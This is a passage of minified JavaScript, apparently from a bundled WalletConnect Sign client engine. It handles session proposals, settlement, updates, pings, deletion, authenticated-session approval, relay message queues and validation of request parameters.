this.client.core.pairing.updateMetadata({topic:o.pairingTopic,metadata:o.requester.metadata})}s.addTrace(xo.publishing_authenticated_session_approve);try{await this.sendResult({topic:l,id:n,result:{cacaos:i,responder:{publicKey:u,metadata:this.client.metadata}},encodeOpts:h,throwOnFailedPublish:!0,appLink:this.getAppLinkIfEnabled(o.requester.metadata,a)})}catch(b){throw s.setError(au.authenticated_session_approve_publish_failure),b}return await this.client.auth.requests.delete(n,{message:"fulfilled",code:0}),await this.client.core.pairing.activate({topic:o.pairingTopic}),this.client.core.eventClient.deleteEvent({eventId:s.eventId}),{session:m}}),Q(this,"rejectSessionAuthenticate",async r=>{this.isInitialized();const{id:n,reason:i}=r,s=this.getPendingAuthRequest(n);if(!s)throw new Error(`Could not find pending auth request with id ${n}`);s.transportType===Wt.relay&&await this.confirmOnlineStateOrThrow();const o=s.requester.publicKey,a=await this.client.core.crypto.generateKeyPair(),c=ad(o),u={type:ps,receiverPublicKey:o,senderPublicKey:a};await this.sendError({id:n,topic:c,error:i,encodeOpts:u,rpcOpts:mr.wc_sessionAuthenticate.reject,appLink:this.getAppLinkIfEnabled(s.requester.metadata,s.transportType)}),await this.client.auth.requests.delete(n,{message:"rejected",code:0}),await this.client.proposal.delete(n,ht("USER_DISCONNECTED"))}),Q(this,"formatAuthMessage",r=>{this.isInitialized();const{request:n,iss:i}=r;return nC(n,i)}),Q(this,"processRelayMessageCache",()=>{setTimeout(async()=>{if(this.relayMessageCache.length!==0)for(;this.relayMessageCache.length>0;)try{const r=this.relayMessageCache.shift();r&&await this.onRelayMessage(r)}catch(r){this.client.logger.error(r)}},50)}),Q(this,"cleanupDuplicatePairings",async r=>{if(r.pairingTopic)try{const n=this.client.core.pairing.pairings.get(r.pairingTopic),i=this.client.core.pairing.pairings.getAll().filter(s=>{var o,a;return((o=s.peerMetadata)==null?void 0:o.url)&&((a=s.peerMetadata)==null?void 0:a.url)===r.peer.metadata.url&&s.topic&&s.topic!==n.topic});if(i.length===0)return;this.client.logger.info(`Cleaning up ${i.length} duplicate pairing(s)`),await Promise.all(i.map(s=>this.client.core.pairing.disconnect({topic:s.topic}))),this.client.logger.info("Duplicate pairings clean up finished")}catch(n){this.client.logger.error(n)}}),Q(this,"deleteSession",async r=>{var n;const{topic:i,expirerHasDeleted:s=!1,emitEvent:o=!0,id:a=0}=r,{self:c}=this.client.session.get(i);await this.client.core.relayer.unsubscribe(i),await this.client.session.delete(i,ht("USER_DISCONNECTED")),this.addToRecentlyDeleted(i,"session"),this.client.core.crypto.keychain.has(c.publicKey)&&await this.client.core.crypto.deleteKeyPair(c.publicKey),this.client.core.crypto.keychain.has(i)&&await this.client.core.crypto.deleteSymKey(i),s||this.client.core.expirer.del(i),this.client.core.storage.removeItem(Mv).catch(u=>this.client.logger.warn(u)),this.getPendingSessionRequests().forEach(u=>{u.topic===i&&this.deletePendingSessionRequest(u.id,ht("USER_DISCONNECTED"))}),i===((n=this.sessionRequestQueue.queue[0])==null?void 0:n.topic)&&(this.sessionRequestQueue.state=_i.idle),o&&this.client.events.emit("session_delete",{id:a,topic:i})}),Q(this,"deleteProposal",async(r,n)=>{if(n)try{const i=this.client.proposal.get(r),s=this.client.core.eventClient.getEvent({topic:i.pairingTopic});s==null||s.setError(Io.proposal_expired)}catch{}await Promise.all([this.client.proposal.delete(r,ht("USER_DISCONNECTED")),n?Promise.resolve():this.client.core.expirer.del(r)]),this.addToRecentlyDeleted(r,"proposal")}),Q(this,"deletePendingSessionRequest",async(r,n,i=!1)=>{await Promise.all([this.client.pendingRequest.delete(r,n),i?Promise.resolve():this.client.core.expirer.del(r)]),this.addToRecentlyDeleted(r,"request"),this.sessionRequestQueue.queue=this.sessionRequestQueue.queue.filter(s=>s.id!==r),i&&(this.sessionRequestQueue.state=_i.idle,this.client.events.emit("session_request_expire",{id:r}))}),Q(this,"deletePendingAuthRequest",async(r,n,i=!1)=>{await Promise.all([this.client.auth.requests.delete(r,n),i?Promise.resolve():this.client.core.expirer.del(r)])}),Q(this,"setExpiry",async(r,n)=>{this.client.session.keys.includes(r)&&(this.client.core.expirer.set(r,n),await this.client.session.update(r,{expiry:n}))}),Q(this,"setProposal",async(r,n)=>{this.client.core.expirer.set(r,lr(mr.wc_sessionPropose.req.ttl)),await this.client.proposal.set(r,n)}),Q(this,"setAuthRequest",async(r,n)=>{const{request:i,pairingTopic:s,transportType:o=Wt.relay}=n;this.client.core.expirer.set(r,i.expiryTimestamp),await this.client.auth.requests.set(r,{authPayload:i.authPayload,requester:i.requester,expiryTimestamp:i.expiryTimestamp,id:r,pairingTopic:s,verifyContext:i.verifyContext,transportType:o})}),Q(this,"setPendingSessionRequest",async r=>{const{id:n,topic:i,params:s,verifyContext:o}=r,a=s.request.expiryTimestamp||lr(mr.wc_sessionRequest.req.ttl);this.client.core.expirer.set(n,a),await this.client.pendingRequest.set(n,{id:n,topic:i,params:s,verifyContext:o})}),Q(this,"sendRequest",async r=>{const{topic:n,method:i,params:s,expiry:o,relayRpcId:a,clientRpcId:c,throwOnFailedPublish:u,appLink:l,tvf:h}=r,d=Ks(i,s,c);let g;const y=!!l;try{const A=y?zs:hi;g=await this.client.core.crypto.encode(n,d,{encoding:A})}catch(A){throw await this.cleanup(),this.client.logger.error(`sendRequest() -> core.crypto.encode() for topic ${n} failed`),A}let m;if(T$.includes(i)){const A=Oi(JSON.stringify(d)),_=Oi(g);m=await this.client.core.verify.register({id:_,decryptedId:A})}const b=mr[i].req;if(b.attestation=m,o&&(b.ttl=o),a&&(b.id=a),this.client.core.history.set(n,d),y){const A=Dh(l,n,g);await global.Linking.openURL(A,this.client.name)}else{const A=mr[i].req;o&&(A.ttl=o),a&&(A.id=a),A.tvf=Qr(yt({},h),{correlationId:d.id}),u?(A.internal=Qr(yt({},A.internal),{throwOnFailedPublish:!0}),await this.client.core.relayer.publish(n,g,A)):this.client.core.relayer.publish(n,g,A).catch(_=>this.client.logger.error(_))}return d.id}),Q(this,"sendResult",async r=>{const{id:n,topic:i,result:s,throwOnFailedPublish:o,encodeOpts:a,appLink:c}=r,u=kf(n,s);let l;const h=c&&typeof(global==null?void 0:global.Linking)<"u";try{const y=h?zs:hi;l=await this.client.core.crypto.encode(i,u,Qr(yt({},a||{}),{encoding:y}))}catch(y){throw await this.cleanup(),this.client.logger.error(`sendResult() -> core.crypto.encode() for topic ${i} failed`),y}let d,g;try{d=await this.client.core.history.get(i,n);const y=d.request;try{this.shouldSetTVF(y.method,y.params)&&(g=this.getTVFParams(n,y.params,s))}catch(m){this.client.logger.warn("sendResult() -> getTVFParams() failed",m)}}catch(y){throw this.client.logger.error(`sendResult() -> history.get(${i}, ${n}) failed`),y}if(h){const y=Dh(c,i,l);await global.Linking.openURL(y,this.client.name)}else{const y=d.request.method,m=mr[y].res;m.tvf=Qr(yt({},g),{correlationId:n}),o?(m.internal=Qr(yt({},m.internal),{throwOnFailedPublish:!0}),await this.client.core.relayer.publish(i,l,m)):this.client.core.relayer.publish(i,l,m).catch(b=>this.client.logger.error(b))}await this.client.core.history.resolve(u)}),Q(this,"sendError",async r=>{const{id:n,topic:i,error:s,encodeOpts:o,rpcOpts:a,appLink:c}=r,u=Df(n,s);let l;const h=c&&typeof(global==null?void 0:global.Linking)<"u";try{const g=h?zs:hi;l=await this.client.core.crypto.encode(i,u,Qr(yt({},o||{}),{encoding:g}))}catch(g){throw await this.cleanup(),this.client.logger.error(`sendError() -> core.crypto.encode() for topic ${i} failed`),g}let d;try{d=await this.client.core.history.get(i,n)}catch(g){throw this.client.logger.error(`sendError() -> history.get(${i}, ${n}) failed`),g}if(h){const g=Dh(c,i,l);await global.Linking.openURL(g,this.client.name)}else{const g=d.request.method,y=a||mr[g].res;this.client.core.relayer.publish(i,l,y)}await this.client.core.history.resolve(u)}),Q(this,"cleanup",async()=>{const r=[],n=[];this.client.session.getAll().forEach(i=>{let s=!1;Fs(i.expiry)&&(s=!0),this.client.core.crypto.keychain.has(i.topic)||(s=!0),s&&r.push(i.topic)}),this.client.proposal.getAll().forEach(i=>{Fs(i.expiryTimestamp)&&n.push(i.id)}),await Promise.all([...r.map(i=>this.deleteSession({topic:i})),...n.map(i=>this.deleteProposal(i))])}),Q(this,"onProviderMessageEvent",async r=>{!this.initialized||this.relayMessageCache.length>0?this.relayMessageCache.push(r):await this.onRelayMessage(r)}),Q(this,"onRelayEventRequest",async r=>{this.requestQueue.queue.push(r),await this.processRequestsQueue()}),Q(this,"processRequestsQueue",async()=>{if(this.requestQueue.state===_i.active){this.client.logger.info("Request queue already active, skipping...");return}for(this.client.logger.info(`Request queue starting with ${this.requestQueue.queue.length} requests`);this.requestQueue.queue.length>0;){this.requestQueue.state=_i.active;const r=this.requestQueue.queue.shift();if(r)try{await this.processRequest(r)}catch(n){this.client.logger.warn(n)}}this.requestQueue.state=_i.idle}),Q(this,"processRequest",async r=>{const{topic:n,payload:i,attestation:s,transportType:o,encryptedId:a}=r,c=i.method;if(!this.shouldIgnorePairingRequest({topic:n,requestMethod:c}))switch(c){case"wc_sessionPropose":return await this.onSessionProposeRequest({topic:n,payload:i,attestation:s,encryptedId:a});case"wc_sessionSettle":return await this.onSessionSettleRequest(n,i);case"wc_sessionUpdate":return await this.onSessionUpdateRequest(n,i);case"wc_sessionExtend":return await this.onSessionExtendRequest(n,i);case"wc_sessionPing":return await this.onSessionPingRequest(n,i);case"wc_sessionDelete":return await this.onSessionDeleteRequest(n,i);case"wc_sessionRequest":return await this.onSessionRequest({topic:n,payload:i,attestation:s,encryptedId:a,transportType:o});case"wc_sessionEvent":return await this.onSessionEventRequest(n,i);case"wc_sessionAuthenticate":return await this.onSessionAuthenticateRequest({topic:n,payload:i,attestation:s,encryptedId:a,transportType:o});default:return this.client.logger.info(`Unsupported request method ${c}`)}}),Q(this,"onRelayEventResponse",async r=>{const{topic:n,payload:i,transportType:s}=r,o=(await this.client.core.history.get(n,i.id)).request.method;switch(o){case"wc_sessionPropose":return this.onSessionProposeResponse(n,i,s);case"wc_sessionSettle":return this.onSessionSettleResponse(n,i);case"wc_sessionUpdate":return this.onSessionUpdateResponse(n,i);case"wc_sessionExtend":return this.onSessionExtendResponse(n,i);case"wc_sessionPing":return this.onSessionPingResponse(n,i);case"wc_sessionRequest":return this.onSessionRequestResponse(n,i);case"wc_sessionAuthenticate":return this.onSessionAuthenticateResponse(n,i);default:return this.client.logger.info(`Unsupported response method ${o}`)}}),Q(this,"onRelayEventUnknownPayload",r=>{const{topic:n}=r,{message:i}=oe("MISSING_OR_INVALID",`Decoded payload on topic ${n} is not identifiable as a JSON-RPC request or a response.`);throw new Error(i)}),Q(this,"shouldIgnorePairingRequest",r=>{const{topic:n,requestMethod:i}=r,s=this.expectedPairingMethodMap.get(n);return!s||s.includes(i)?!1:!!(s.includes("wc_sessionAuthenticate")&&this.client.events.listenerCount("session_authenticate")>0)}),Q(this,"onSessionProposeRequest",async r=>{const{topic:n,payload:i,attestation:s,encryptedId:o}=r,{params:a,id:c}=i;try{const u=this.client.core.eventClient.getEvent({topic:n});this.client.events.listenerCount("session_proposal")===0&&(console.warn("No listener for session_proposal event"),u==null||u.setError(ss.proposal_listener_not_found)),this.isValidConnect(yt({},i.params));const l=a.expiryTimestamp||lr(mr.wc_sessionPropose.req.ttl),h=yt({id:c,pairingTopic:n,expiryTimestamp:l},a);await this.setProposal(c,h);const d=await this.getVerifyContext({attestationId:s,hash:Oi(JSON.stringify(i)),encryptedId:o,metadata:h.proposer.metadata});u==null||u.addTrace(xi.emit_session_proposal),this.client.events.emit("session_proposal",{id:c,params:h,verifyContext:d})}catch(u){await this.sendError({id:c,topic:n,error:u,rpcOpts:mr.wc_sessionPropose.autoReject}),this.client.logger.error(u)}}),Q(this,"onSessionProposeResponse",async(r,n,i)=>{const{id:s}=n;if(Ti(n)){const{result:o}=n;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",result:o});const a=this.client.proposal.get(s);this.client.logger.trace({type:"method",method:"onSessionProposeResponse",proposal:a});const c=a.proposer.publicKey;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",selfPublicKey:c});const u=o.responderPublicKey;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",peerPublicKey:u});const l=await this.client.core.crypto.generateSharedKey(c,u);this.pendingSessions.set(s,{sessionTopic:l,pairingTopic:r,proposalId:s,publicKey:c});const h=await this.client.core.relayer.subscribe(l,{transportType:i});this.client.logger.trace({type:"method",method:"onSessionProposeResponse",subscriptionId:h}),await this.client.core.pairing.activate({topic:r})}else if(zn(n)){await this.client.proposal.delete(s,ht("USER_DISCONNECTED"));const o=it("session_connect",s);if(this.events.listenerCount(o)===0)throw new Error(`emitting ${o} without any listeners, 954`);this.events.emit(o,{error:n.error})}}),Q(this,"onSessionSettleRequest",async(r,n)=>{const{id:i,params:s}=n;try{this.isValidSessionSettleRequest(s);const{relay:o,controller:a,expiry:c,namespaces:u,sessionProperties:l,scopedProperties:h,sessionConfig:d}=n.params,g=[...this.pendingSessions.values()].find(b=>b.sessionTopic===r);if(!g)return this.client.logger.error(`Pending session not found for topic ${r}`);const y=this.client.proposal.get(g.proposalId),m=Qr(yt(yt(yt({topic:r,relay:o,expiry:c,namespaces:u,acknowledged:!0,pairingTopic:g.pairingTopic,requiredNamespaces:y.requiredNamespaces,optionalNamespaces:y.optionalNamespaces,controller:a.publicKey,self:{publicKey:g.publicKey,metadata:this.client.metadata},peer:{publicKey:a.publicKey,metadata:a.metadata}},l&&{sessionProperties:l}),h&&{scopedProperties:h}),d&&{sessionConfig:d}),{transportType:Wt.relay});await this.client.session.set(m.topic,m),await this.setExpiry(m.topic,m.expiry),await this.client.core.pairing.updateMetadata({topic:g.pairingTopic,metadata:m.peer.metadata}),this.client.events.emit("session_connect",{session:m}),this.events.emit(it("session_connect",g.proposalId),{session:m}),this.pendingSessions.delete(g.proposalId),this.deleteProposal(g.proposalId,!1),this.cleanupDuplicatePairings(m),await this.sendResult({id:n.id,topic:r,result:!0,throwOnFailedPublish:!0})}catch(o){await this.sendError({id:i,topic:r,error:o}),this.client.logger.error(o)}}),Q(this,"onSessionSettleResponse",async(r,n)=>{const{id:i}=n;Ti(n)?(await this.client.session.update(r,{acknowledged:!0}),this.events.emit(it("session_approve",i),{})):zn(n)&&(await this.client.session.delete(r,ht("USER_DISCONNECTED")),this.events.emit(it("session_approve",i),{error:n.error}))}),Q(this,"onSessionUpdateRequest",async(r,n)=>{const{params:i,id:s}=n;try{const o=`${r}_session_update`,a=su.get(o);if(a&&this.isRequestOutOfSync(a,s)){this.client.logger.warn(`Discarding out of sync request - ${s}`),this.sendError({id:s,topic:r,error:ht("INVALID_UPDATE_REQUEST")});return}this.isValidUpdate(yt({topic:r},i));try{su.set(o,s),await this.client.session.update(r,{namespaces:i.namespaces}),await this.sendResult({id:s,topic:r,result:!0,throwOnFailedPublish:!0})}catch(c){throw su.delete(o),c}this.client.events.emit("session_update",{id:s,topic:r,params:i})}catch(o){await this.sendError({id:s,topic:r,error:o}),this.client.logger.error(o)}}),Q(this,"isRequestOutOfSync",(r,n)=>n.toString().slice(0,-3)<r.toString().slice(0,-3)),Q(this,"onSessionUpdateResponse",(r,n)=>{const{id:i}=n,s=it("session_update",i);if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners`);Ti(n)?this.events.emit(it("session_update",i),{}):zn(n)&&this.events.emit(it("session_update",i),{error:n.error})}),Q(this,"onSessionExtendRequest",async(r,n)=>{const{id:i}=n;try{this.isValidExtend({topic:r}),await this.setExpiry(r,lr(Pa)),await this.sendResult({id:i,topic:r,result:!0,throwOnFailedPublish:!0}),this.client.events.emit("session_extend",{id:i,topic:r})}catch(s){await this.sendError({id:i,topic:r,error:s}),this.client.logger.error(s)}}),Q(this,"onSessionExtendResponse",(r,n)=>{const{id:i}=n,s=it("session_extend",i);if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners`);Ti(n)?this.events.emit(it("session_extend",i),{}):zn(n)&&this.events.emit(it("session_extend",i),{error:n.error})}),Q(this,"onSessionPingRequest",async(r,n)=>{const{id:i}=n;try{this.isValidPing({topic:r}),await this.sendResult({id:i,topic:r,result:!0,throwOnFailedPublish:!0}),this.client.events.emit("session_ping",{id:i,topic:r})}catch(s){await this.sendError({id:i,topic:r,error:s}),this.client.logger.error(s)}}),Q(this,"onSessionPingResponse",(r,n)=>{const{id:i}=n,s=it("session_ping",i);setTimeout(()=>{if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners 2176`);Ti(n)?this.events.emit(it("session_ping",i),{}):zn(n)&&this.events.emit(it("session_ping",i),{error:n.error})},500)}),Q(this,"onSessionDeleteRequest",async(r,n)=>{const{id:i}=n;try{this.isValidDisconnect({topic:r,reason:n.params}),Promise.all([new Promise(s=>{this.client.core.relayer.once(vr.publish,async()=>{s(await this.deleteSession({topic:r,id:i}))})}),this.sendResult({id:i,topic:r,result:!0,throwOnFailedPublish:!0}),this.cleanupPendingSentRequestsForTopic({topic:r,error:ht("USER_DISCONNECTED")})]).catch(s=>this.client.logger.error(s))}catch(s){this.client.logger.error(s)}}),Q(this,"onSessionRequest",async r=>{var n,i,s;const{topic:o,payload:a,attestation:c,encryptedId:u,transportType:l}=r,{id:h,params:d}=a;try{await this.isValidRequest(yt({topic:o},d));const g=this.client.session.get(o),y=await this.getVerifyContext({attestationId:c,hash:Oi(JSON.stringify(Ks("wc_sessionRequest",d,h))),encryptedId:u,metadata:g.peer.metadata,transportType:l}),m={id:h,topic:o,params:d,verifyContext:y};await this.setPendingSessionRequest(m),l===Wt.link_mode&&(n=g.peer.metadata.redirect)!=null&&n.universal&&this.client.core.addLinkModeSupportedApp((i=g.peer.metadata.redirect)==null?void 0:i.universal),(s=this.client.signConfig)!=null&&s.disableRequestQueue?this.emitSessionRequest(m):(this.addSessionRequestToSessionRequestQueue(m),this.processSessionRequestQueue())}catch(g){await this.sendError({id:h,topic:o,error:g}),this.client.logger.error(g)}}),Q(this,"onSessionRequestResponse",(r,n)=>{const{id:i}=n,s=it("session_request",i);if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners`);Ti(n)?this.events.emit(it("session_request",i),{result:n.result}):zn(n)&&this.events.emit(it("session_request",i),{error:n.error})}),Q(this,"onSessionEventRequest",async(r,n)=>{const{id:i,params:s}=n;try{const o=`${r}_session_event_${s.event.name}`,a=su.get(o);if(a&&this.isRequestOutOfSync(a,i)){this.client.logger.info(`Discarding out of sync request - ${i}`);return}this.isValidEmit(yt({topic:r},s)),this.client.events.emit("session_event",{id:i,topic:r,params:s}),su.set(o,i)}catch(o){await this.sendError({id:i,topic:r,error:o}),this.client.logger.error(o)}}),Q(this,"onSessionAuthenticateResponse",(r,n)=>{const{id:i}=n;this.client.logger.trace({type:"method",method:"onSessionAuthenticateResponse",topic:r,payload:n}),Ti(n)?this.events.emit(it("session_request",i),{result:n.result}):zn(n)&&this.events.emit(it("session_request",i),{error:n.error})}),Q(this,"onSessionAuthenticateRequest",async r=>{var n;const{topic:i,payload:s,attestation:o,encryptedId:a,transportType:c}=r;try{const{requester:u,authPayload:l,expiryTimestamp:h}=s.params,d=await this.getVerifyContext({attestationId:o,hash:Oi(JSON.stringify(s)),encryptedId:a,metadata:u.metadata,transportType:c}),g={requester:u,pairingTopic:i,id:s.id,authPayload:l,verifyContext:d,expiryTimestamp:h};await this.setAuthRequest(s.id,{request:g,pairingTopic:i,transportType:c}),c===Wt.link_mode&&(n=u.metadata.redirect)!=null&&n.universal&&this.client.core.addLinkModeSupportedApp(u.metadata.redirect.universal),this.client.events.emit("session_authenticate",{topic:i,params:s.params,id:s.id,verifyContext:d})}catch(u){this.client.logger.error(u);const l=s.params.requester.publicKey,h=await this.client.core.crypto.generateKeyPair(),d=this.getAppLinkIfEnabled(s.params.requester.metadata,c),g={type:ps,receiverPublicKey:l,senderPublicKey:h};await this.sendError({id:s.id,topic:i,error:u,encodeOpts:g,rpcOpts:mr.wc_sessionAuthenticate.autoReject,appLink:d})}}),Q(this,"addSessionRequestToSessionRequestQueue",r=>{this.sessionRequestQueue.queue.push(r)}),Q(this,"cleanupAfterResponse",r=>{this.deletePendingSessionRequest(r.response.id,{message:"fulfilled",code:0}),setTimeout(()=>{this.sessionRequestQueue.state=_i.idle,this.processSessionRequestQueue()},se.toMiliseconds(this.requestQueueDelay))}),Q(this,"cleanupPendingSentRequestsForTopic",({topic:r,error:n})=>{const i=this.client.core.history.pending;i.length>0&&i.filter(s=>s.topic===r&&s.request.method==="wc_sessionRequest").forEach(s=>{const o=s.request.id,a=it("session_request",o);if(this.events.listenerCount(a)===0)throw new Error(`emitting ${a} without any listeners`);this.events.emit(it("session_request",s.request.id),{error:n})})}),Q(this,"processSessionRequestQueue",()=>{if(this.sessionRequestQueue.state===_i.active){this.client.logger.info("session request queue is already active.");return}const r=this.sessionRequestQueue.queue[0];if(!r){this.client.logger.info("session request queue is empty.");return}try{this.sessionRequestQueue.state=_i.active,this.emitSessionRequest(r)}catch(n){this.client.logger.error(n)}}),Q(this,"emitSessionRequest",r=>{this.client.events.emit("session_request",r)}),Q(this,"onPairingCreated",r=>{if(r.methods&&this.expectedPairingMethodMap.set(r.topic,r.methods),r.active)return;const n=this.client.proposal.getAll().find(i=>i.pairingTopic===r.topic);n&&this.onSessionProposeRequest({topic:r.topic,payload:Ks("wc_sessionPropose",Qr(yt({},n),{requiredNamespaces:n.requiredNamespaces,optionalNamespaces:n.optionalNamespaces,relays:n.relays,proposer:n.proposer,sessionProperties:n.sessionProperties,scopedProperties:n.scopedProperties}),n.id)})}),Q(this,"isValidConnect",async r=>{if(!un(r)){const{message:u}=oe("MISSING_OR_INVALID",`connect() params: ${JSON.stringify(r)}`);throw new Error(u)}const{pairingTopic:n,requiredNamespaces:i,optionalNamespaces:s,sessionProperties:o,scopedProperties:a,relays:c}=r;if(Or(n)||await this.isValidPairingTopic(n),!M8(c)){const{message:u}=oe("MISSING_OR_INVALID",`connect() relays: ${c}`);throw new Error(u)}if(!Or(i)&&Yu(i)!==0&&this.validateNamespaces(i,"requiredNamespaces"),!Or(s)&&Yu(s)!==0&&this.validateNamespaces(s,"optionalNamespaces"),Or(o)||this.validateSessionProps(o,"sessionProperties"),!Or(a)){this.validateSessionProps(a,"scopedProperties");const u=Object.keys(i||{}).concat(Object.keys(s||{}));if(!Object.keys(a).every(l=>u.includes(l)))throw new Error(`Scoped properties must be a subset of required/optional namespaces, received: ${JSON.stringify(a)}, required/optional namespaces: ${JSON.stringify(u)}`)}}),Q(this,"validateNamespaces",(r,n)=>{const i=D8(r,"connect()",n);if(i)throw new Error(i.message)}),Q(this,"isValidApprove",async r=>{if(!un(r))throw new Error(oe("MISSING_OR_INVALID",`approve() params: ${r}`).message);const{id:n,namespaces:i,relayProtocol:s,sessionProperties:o,scopedProperties:a}=r;this.checkRecentlyDeleted(n),await this.isValidProposalId(n);const c=this.client.proposal.get(n),u=ng(i,"approve()");if(u)throw new Error(u.message);const l=ev(c.requiredNamespaces,i,"approve()");if(l)throw new Error(l.message);if(!ar(s,!0)){const{message:h}=oe("MISSING_OR_INVALID",`approve() relayProtocol: ${s}`);throw new Error(h)}if(Or(o)||this.validateSessionProps(o,"sessionProperties"),!Or(a)){this.validateSessionProps(a,"scopedProperties");const h=new Set(Object.keys(i));if(!Object.keys(a).every(d=>h.has(d)))throw new Error(`Scoped properties must be a subset of approved namespaces, received: ${JSON.stringify(a)}, approved namespaces: ${Array.from(h).join(", ")}`)}}),Q(this,"isValidReject",async r=>{if(!un(r)){const{message:s}=oe("MISSING_OR_INVALID",`reject() params: ${r}`);throw new Error(s)}const{id:n,reason:i}=r;if(this.checkRecentlyDeleted(n),await this.isValidProposalId(n),!U8(i)){const{message:s}=oe("MISSING_OR_INVALID",`reject() reason: ${JSON.stringify(i)}`);throw new Error(s)}}),Q(this,"isValidSessionSettleRequest",r=>{if(!un(r)){const{message:u}=oe("MISSING_OR_INVALID",`onSessionSettleRequest() params: ${r}`);throw new Error(u)}const{relay:n,controller:i,namespaces:s,expiry:o}=r;if(!TC(n)){const{message:u}=oe("MISSING_OR_INVALID","onSessionSettleRequest() relay protocol should be a string");throw new Error(u)}const a=N8(i,"onSessionSettleRequest()");if(a)throw new Error(a.message);const c=ng(s,"onSessionSettleRequest()");if(c)throw new Error(c.message);if(Fs(o)){const{message:u}=oe("EXPIRED","onSessionSettleRequest()");throw new Error(u)}}),Q(this,"isValidUpdate",async r=>{if(!un(r)){const{message:c}=oe("MISSING_OR_INVALID",`update() params: ${r}`);throw new Error(c)}const{topic:n,namespaces:i}=r;this.checkRecentlyDeleted(n),await this.isValidSessionTopic(n);const s=this.client.session.get(n),o=ng(i,"update()");if(o)throw new Error(o.message);const a=ev(s.requiredNamespaces,i,"update()");if(a)throw new Error(a.message)}),Q(this,"isValidExtend",async r=>{if(!un(r)){const{message:i}=oe("MISSING_OR_INVALID",`extend() params: ${r}`);throw new Error(i)}const{topic:n}=r;this.checkRecentlyDeleted(n),await this.isValidSessionTopic(n)}),Q(this,"isValidRequest",async r=>{if(!un(r)){const{message:c}=oe("MISSING_OR_INVALID",`request() params: ${r}`);throw new Error(c)}const{topic:n,request:i,chainId:s,expiry:o}=r;this.checkRecentlyDeleted(n),await this.isValidSessionTopic(n);const{namespaces:a}=this.client.session.get(n);if(!Xb(a,s)){const{message:c}=oe("MISSING_OR_INVALID",`request() chainId: ${s}`);throw new Error(c)}if(!$8(i)){const{message:c}=oe("MISSING_OR_INVALID",`request() ${JSON.stringify(i)}`);throw new Error(c)}if(!j8(a,s,i.method)){const{message:c}=oe("MISSING_OR_INVALID",`request() method: ${i.method}`);throw new Error(c)}if(o&&!W8(o,hg)){const{message:c}=oe("MISSING_OR_INVALID",`request() expiry: ${o}. Expiry must be a number (in seconds) between ${hg.min} and ${hg.max}`);throw new Error(c)}}),Q(this,"isValidRespond",async r=>{var n;if(!un(r)){const{message:o}=oe("MISSING_OR_INVALID",`respond() params: ${r}`);throw new Error(o)}const{topic:i,response:s}=r;try{await this.isValidSessionTopic(i)}catch(o){throw(n=r==null?void 0:r.response)!=null&&n.id&&this.cleanupAfterResponse(r),o}if(!L8(s)){const{message:o}=oe("MISSING_OR_INVALID",`respond() response: ${JSON.stringify(s)}`);throw new Error(o)}}),Q(this,"isValidPing",async r=>{if(!un(r)){const{message:i}=oe("MISSING_OR_INVALID",`ping() params: ${r}`);throw new Error(i)}const{topic:n}=r;await this.isValidSessionOrPairingTopic(n)}),Q(this,"isValidEmit",async r=>{if(!un(r)){const{message:a}=oe("MISSING_OR_INVALID",`emit() params: ${r}`);throw new Error(a)}const{topic:n,event:i,chainId:s}=r;await this.isValidSessionTopic(n);const{namespaces:o}=this.client.session.get(n);if(!Xb(o,s)){const{message:a}=oe("MISSING_OR_INVALID",`emit() chainId: ${s}`);throw new Error(a)}if(!F8(i)){const{message:a}=oe("MISSING_OR_INVALID",`emit() event: ${JSON.stringify(i)}`);throw new Error(a)}if(!q8(o,s,i.name)){const{message:a}=oe("MISSING_OR_INVALID",`emit() event: ${JSON.stringify(i)}`);throw new Error(a)}}),Q(this,"isValidDisconnect",async r=>{if(!un(r)){const{message:i}=oe("MISSING_OR_INVALID",`disconnect() params: ${r}`);throw new Error(i)}const{topic:n}=r;await this.isValidSessionOrPairingTopic(n)}),Q(this,"isValidAuthenticate",r=>{const{chains:n,uri:i,domain:s,nonce:o}=r;if(!Array.isArray(n)||n.length===0)throw new Error("chains is required and must be a non-empty array");if(!ar(i,!1))throw new Error("uri is required parameter");if(!ar(s,!1))throw new Error("domain is required parameter");if(!ar(o,!1))throw new Error("nonce is required parameter");if([...new Set(n.map(c=>ic(c).namespace))].length>1)throw new Error("Multi-namespace requests are not supported. Please request single namespace only.");const{namespace:a}=ic(n[0]);if(a!=="eip155")throw new Error("Only eip155 namespace is supported for authenticated sessions. Please use .connect() for non-eip155 chains.")}),Q(this,"getVerifyContext",async r=>{const{attestationId:n,hash:i,encryptedId:s,metadata:o,transportType:a}=r,c={verified:{verifyUrl:o.verifyUrl||Tu,validation:"UNKNOWN",origin:o.url||""}};try{if(a===Wt.link_mode){const l=this.getAppLinkIfEnabled(o,a);return c.verified.validation=l&&new URL(l).origin===new URL(o.url).origin?"VALID":"INVALID",c}const u=await this.client.core.verify.resolve({attestationId:n,hash:i,encryptedId:s,verifyUrl:o.verifyUrl});u&&(c.verified.origin=u.origin,c.verified.isScam=u.isScam,c.verified.validation=u.origin===new URL(o.url).origin?"VALID":"INVALID")}catch(u){this.client.logger.warn(u)}return this.client.logger.debug(`Verify context: ${JSON.stringify(c)}`),c}),Q(this,"validateSessionProps",(r,n)=>{Object.values(r).forEach((i,s)=>{if(i==null){const{message:o}=oe("MISSING_OR_INVALID",`${n} must contain an existing value for each key. Received: ${i} for key ${Object.keys(r)[s]}`);throw new Error(o)}})}),Q(this,"getPendingAuthRequest",r=>{const n=this.client.auth.requests.get(r);return typeof n=="object"?n:void 0}),Q(this,"addToRecentlyDeleted",(r,n)=>{if(this.recentlyDeletedMap.set(r,n),this.recentlyDeletedMap.size>=this.recentlyDeletedLimit){let i=0;const s=this.recentlyDeletedLimit/2;for(const o of this.recentlyDeletedMap.keys()){if(i++>=s)break;this.recentlyDeletedMap.delete(o)}}}),Q(this,"checkRecentlyDeleted",r=>{const n=this.recentlyDeletedMap.get(r);if(n){const{message:i}=oe("MISSING_OR_INVALID",`Record was recently deleted - ${n}: ${r}`);throw new Error(i)}}),Q(this,"isLinkModeEnabled",(r,n)=>{var i,s,o,a,c,u,l,h,d;return!r||n!==Wt.link_mode?!1:((s=(i=this.client.metadata)==null?void 0:i.redirect)==null?void 